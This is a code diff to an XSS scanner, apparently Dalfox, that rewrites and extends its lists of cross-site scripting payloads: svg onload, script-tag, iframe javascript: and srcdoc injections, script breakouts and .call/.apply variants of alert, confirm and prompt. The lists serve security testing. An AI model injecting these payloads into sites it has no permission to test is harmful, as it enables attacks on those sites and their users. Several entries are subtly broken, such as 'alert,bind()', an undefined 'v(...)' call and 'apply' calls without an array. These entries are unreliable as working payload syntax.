@@ -308,38 +308,43 @@ func getCommonPayload() []string {
 }
 
 func getHTMLPayload(ip string) []string {
-	payload := []string{
-		"<sVg/onload=prompt(DALFOX_ALERT_VALUE) class=dalfox>",
-		"<Svg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
-		"<svG/onload=confirm(DALFOX_ALERT_VALUE) class=dalfox>",
-		"<svG/onload=print(DALFOX_ALERT_VALUE) class=dalfox>",
-		"<ScRipt class=dalfox>alert(DALFOX_ALERT_VALUE)</script>",
-		"<sCriPt class=dalfox>prompt(DALFOX_ALERT_VALUE)</script>",
-		"<scRipT class=dalfox>confirm(DALFOX_ALERT_VALUE)</script>",
-		"<scRipT class=dalfox>print(DALFOX_ALERT_VALUE)</script>",
+	var payload []string
+	payloadFunc := []string{
+		"alert",
+		"confirm",
+		"prompt",
+		"alert,bind()",
+		"alert.valueOf()",
+		"print",
+	}
+	payloadPattern := []string{
+		"<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
+		"<ScRipt class=dalfox>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
+		"<iframe srcdoc=\"<input onauxclick=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
-		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
-		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
-		"<iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
-		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
-		"<dalfox class=dalfox>",
-		"<sVg/onload=prompt(DALFOX_ALERT_VALUE)>",
-		"<Svg/onload=alert(DALFOX_ALERT_VALUE)>",
-		"<svG/onload=confirm(DALFOX_ALERT_VALUE)>",
-		"<svG/onload=print(DALFOX_ALERT_VALUE)>",
-		"<ScRipt>alert(DALFOX_ALERT_VALUE)</script>",
-		"<sCriPt>prompt(DALFOX_ALERT_VALUE)</script>",
-		"<scRipT>confirm(DALFOX_ALERT_VALUE)</script>",
-		"<scRipT>print(DALFOX_ALERT_VALUE)</script>",
+		"<audio controls ondurationchange=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
+		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></menu></div>",
+		"<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
+		"<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE) class=dalfox>",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
-		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
+		"<audio controls ondurationchange=v(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
 		"<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
-		"<iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE)></iFramE>",
-		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE)>",
-		"<iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
-		"<iframe srcdoc=\"<input onauxclick=prompt(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
-		"<iframe srcdoc=\"<input onauxclick=confirm(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
-		"<iframe srcdoc=\"<input onauxclick=print(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
+		"<iFrAme/src=jaVascRipt:DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)></iFramE>",
+		"<xmp><p title=\"</xmp><svg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
+		"<sVg/onload=DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)>",
+		"<ScRipt>DALFOX_FUNC_VALUE(DALFOX_ALERT_VALUE)</script>",
+		"<dalfox class=dalfox>",
+	}
+	for _, p := range payloadPattern {
+		if strings.Contains(p, "DALFOX_FUNC_VALUE") {
+			for _, pf := range payloadFunc {
+				var pt string
+				pt = strings.Replace(p, "DALFOX_FUNC_VALUE", pf, -1)
+				payload = append(payload, pt)
+			}
+		} else {
+			payload = append(payload, p)
+		}
 	}
 	if strings.Contains(ip, "comment") {
 		// TODO add comment payloads
@@ -374,6 +379,12 @@ func getAttrPayload(ip string) []string {
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=alert.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=confirm.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=prompt.call(null,DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=alert.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=confirm.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=prompt.apply(null,DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=print(DALFOX_ALERT_VALUE) class=dalfox ")
 	}
 
@@ -420,6 +431,12 @@ func getInJsPayload(ip string) []string {
 		"confirm(DALFOX_ALERT_VALUE)",
 		"prompt(DALFOX_ALERT_VALUE)",
 		"print(DALFOX_ALERT_VALUE)",
+		"alert.call(null,DALFOX_ALERT_VALUE)",
+		"confirm.call(null,DALFOX_ALERT_VALUE)",
+		"prompt.call(null,DALFOX_ALERT_VALUE)",
+		"alert.apply(null,[DALFOX_ALERT_VALUE])",
+		"prompt.apply(null,[DALFOX_ALERT_VALUE])",
+		"confirm.apply(null,[DALFOX_ALERT_VALUE])",
 		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
 		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
 		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
